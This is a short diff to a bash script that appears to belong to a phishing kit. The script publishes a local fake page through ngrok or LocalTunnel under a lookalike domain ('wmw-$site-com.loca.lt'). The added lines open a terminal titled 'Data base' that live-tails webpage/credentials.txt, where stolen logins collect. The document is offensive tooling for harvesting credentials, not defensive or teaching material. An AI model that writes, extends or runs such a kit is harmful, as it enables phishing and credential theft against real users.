@@ -330,6 +330,9 @@ printf "${BGreen}OK.${clear}\n\n"
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "${BYellow}Your Domain is:${BGreen} %s\e[0m\n" $link
 printf "\n"
+sleep 2
+xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
+sleep 1
 
 checkfound
 
@@ -355,6 +358,11 @@ xterm -hold -geometry 90x26+1000+1000 -T "LocalTunnel server" -e "lt --port 443 
 sleep 10
 printf "${BGreen}OK.${clear}\n\n"
 printf "${BYellow}Your URL name is: ${BGreen}https://wmw-$site-com.loca.lt\n"
+printf "\n"
+sleep 2
+xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
+sleep 1
+
 checkfound
 #===============================================
 }
